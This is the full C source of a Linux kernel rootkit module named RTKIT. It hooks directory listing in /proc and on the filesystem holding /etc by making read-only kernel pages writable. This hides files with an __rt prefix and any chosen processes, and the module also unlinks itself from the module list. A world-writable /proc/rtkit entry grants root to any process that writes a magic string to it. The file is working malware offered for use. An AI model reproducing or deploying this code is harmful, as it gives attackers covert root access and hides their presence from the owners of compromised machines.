#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/kernel.h>

#include <linux/proc_ns.h>
#include <linux/spinlock.h>
#include <linux/atomic.h>
#include <linux/binfmts.h>

/*
 * This is not completely implemented yet. The idea is to
 * create an in-memory tree (like the actual /proc filesystem
 * tree) of these proc_dir_entries, so that we can dynamically
 * add new files to /proc.
 *
 * The "next" pointer creates a linked list of one /proc directory,
 * while parent/subdir create the directory structure (every
 * /proc file has a parent, but "subdir" is NULL for all
 * non-directory entries).
 */
struct proc_dir_entry {
    unsigned int low_ino;
    umode_t mode;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    const struct inode_operations *proc_iops;
    const struct file_operations *proc_fops;
    struct proc_dir_entry *next, *parent, *subdir;
    void *data;
    atomic_t count;     /* use count */
    atomic_t in_use;    /* number of callers into module in progress; */
            /* negative -> it's going away RSN */
    struct completion *pde_unload_completion;
    struct list_head pde_openers;   /* who did ->open, but not ->release */
    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
    u8 namelen;
    char name[];
};

#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })


#define MAX_PIDS 50

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Arkadiusz Hiler<ivyl@sigillum.cc>");
MODULE_AUTHOR("Michal Winiarski<t3hkn0r@gmail.com>");

//STATIC VARIABLES SECTION
//we don't want to have it visible in kallsyms and have access to it all the time
static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_rtkit;

static int (*proc_iterate_orig)(struct file *, struct dir_context *);
static int (*fs_iterate_orig)(struct file *, struct dir_context *);

static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;

static struct file_operations *proc_fops;
static struct file_operations *fs_fops;

static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static char pids_to_hide[MAX_PIDS][8];
static struct task_struct* proc_to_hide[MAX_PIDS];
static int current_pid = 0;

static char hide_files = 1;

static char module_hidden = 0;

static char module_status[1024];

static int size, temp;

//MODULE HELPERS
void module_hide(void)
{
	if (module_hidden) return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = !module_hidden;
}
 
void module_show(void)
{
	int result;
	if (!module_hidden) return;
	list_add(&THIS_MODULE->list, module_previous);
	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
	module_hidden = !module_hidden;
}

//PAGE RW HELPERS
static void set_addr_rw(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

static void set_addr_ro(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	pte->pte = pte->pte &~_PAGE_RW;
}

//CALLBACK SECTION
static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	int i;
	for (i=0; i < current_pid; i++) {
		if (!strcmp(name, pids_to_hide[i])) return 0;
	}
	if (!strcmp(name, "rtkit")) return 0;
	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int proc_iterate_new(struct file *filp, struct dir_context *ctx)
{
	proc_filldir_orig = ctx->actor;
    *((filldir_t *)&ctx->actor) = &proc_filldir_new;
	return proc_iterate_orig(filp, ctx);
}

static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	if (hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) return 0;
	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int fs_iterate_new(struct file *filp, struct dir_context *ctx)
{
	fs_filldir_orig = ctx->actor;
    *((filldir_t *)&ctx->actor) = &fs_filldir_new;
	return fs_iterate_orig(filp, ctx);
}

static ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, loff_t *ppos)
{
	if (count > temp)
        count = temp;
    temp = temp-count;
  
    copy_to_user(buffer, module_status, count);

    if(count == 0) {
        sprintf(module_status, 
    "RTKIT\n\
    DESC:\n\
      hides files prefixed with __rt or 10-__rt and gives root\n\
    CMNDS:\n\
      mypenislong - uid and gid 0 for writing process\n\
      hpXXXX - hides proc with id XXXX\n\
      up - unhides last process\n\
      thf - toogles file hiding\n\
      mh - module hide\n\
      ms - module show\n\
    STATUS\n\
      fshide: %d\n\
      pids_hidden: %d\n\
      module_hidden: %d\n", hide_files, current_pid, module_hidden);

        size = strlen(module_status);
        temp = size;
	
    }
  
	return count;
}

static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *ppos)
{
	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
		struct cred *credentials = prepare_creds();
		credentials->uid = credentials->euid = 0;
		credentials->gid = credentials->egid = 0;
		commit_creds(credentials);
	} else if (!strncmp(buff, "hp", MIN(2, count))) {//hpXXXXXX hides process with given id
		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
	} else if (!strncmp(buff, "dh", MIN(2, count))) {//dhXXXXXX deeply hides process with given id, delete it from tasklist
		if (current_pid < MAX_PIDS) {
            struct task_struct *p;
            long pid;
            char pid_s[MIN(7, count-2)+1];
            pid_s[MIN(7, count-2)] = 0;
            strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
            strncpy(pid_s, buff+2, MIN(7, count-2));
            for_each_process(p) {
                kstrtol(pid_s, 10, &pid);
                if (pid == p->pid) {
                    printk("----------%d: %s\n", pid, p->comm);
                    proc_to_hide[current_pid] = p;
                    //list_del(&p->tasks);
                    p->tasks.prev->next = p->tasks.next;
                    p->tasks.next->prev = p->tasks.prev;
                }
            }
        }
	} else if (!strncmp(buff, "up", MIN(2, count))) {//unhides last hidden process
        if (current_pid > 0 && proc_to_hide[current_pid] != NULL)
            list_add(&proc_to_hide[current_pid]->tasks, proc_to_hide[current_pid]->tasks.prev);
		if (current_pid > 0) current_pid--;
	} else if (!strncmp(buff, "thf", MIN(3, count))) {//toggles hide files in fs
		hide_files = !hide_files;
	} else if (!strncmp(buff, "mh", MIN(2, count))) {//module hide
		module_hide();
	} else if (!strncmp(buff, "ms", MIN(2, count))) {//module hide
		module_show();
	}

        return count;
}

//INITIALIZING/CLEANING HELPER METHODS SECTION
static void procfs_clean(void)
{
	if (proc_rtkit != NULL) {
		remove_proc_entry("rtkit", NULL);
		proc_rtkit = NULL;
	}
	if (proc_fops != NULL && proc_iterate_orig != NULL) {
		set_addr_rw(proc_fops);
		proc_fops->iterate = proc_iterate_orig;
		set_addr_ro(proc_fops);
	}
}
	
static void fs_clean(void)
{
	if (fs_fops != NULL && fs_iterate_orig != NULL) {
		set_addr_rw(fs_fops);
		fs_fops->iterate = fs_iterate_orig;
		set_addr_ro(fs_fops);
	}
}

static const struct file_operations proc_rtkit_fops = {
    .owner = THIS_MODULE,
    .read = rtkit_read,
    .write = rtkit_write,
};

static int __init procfs_init(void)
{
	//new entry in proc root with 666 rights
	proc_rtkit = proc_create("rtkit", 0666, NULL, &proc_rtkit_fops);
	if (proc_rtkit == NULL) return 0;
	proc_root = proc_rtkit->parent;
	if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
		return 0;
	}
	
	sprintf(module_status, 
"RTKIT\n\
DESC:\n\
  hides files prefixed with __rt or 10-__rt and gives root\n\
CMNDS:\n\
  mypenislong - uid and gid 0 for writing process\n\
  hpXXXX - hides proc with id XXXX\n\
  up - unhides last process\n\
  thf - toogles file hiding\n\
  mh - module hide\n\
  ms - module show\n\
STATUS\n\
  fshide: %d\n\
  pids_hidden: %d\n\
  module_hidden: %d\n", hide_files, current_pid, module_hidden);

	size = strlen(module_status);
    temp = size;
	
	//substitute proc iterate to our wersion (using page mode change)
	proc_fops = ((struct file_operations *) proc_root->proc_fops);
	proc_iterate_orig = proc_fops->iterate;
	set_addr_rw(proc_fops);
	proc_fops->iterate = proc_iterate_new;
	set_addr_ro(proc_fops);
	
	return 1;
}

static int __init fs_init(void)
{
	struct file *etc_filp;
	
	//get file_operations of /etc
	etc_filp = filp_open("/etc", O_RDONLY, 0);
	if (etc_filp == NULL) return 0;
	fs_fops = (struct file_operations *) etc_filp->f_op;
	filp_close(etc_filp, NULL);
	
	//substitute iterate of fs on which /etc is
	fs_iterate_orig = fs_fops->iterate;
	set_addr_rw(fs_fops);
	fs_fops->iterate = fs_iterate_new;
	set_addr_ro(fs_fops);
	
	return 1;
}


//MODULE INIT/EXIT
static int __init rootkit_init(void)
{
	if (!procfs_init() || !fs_init()) {
		procfs_clean();
		fs_clean();
		return 1;
	}
	module_hide();
	
	return 0;
}

static void __exit rootkit_exit(void)
{
	procfs_clean();
	fs_clean();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
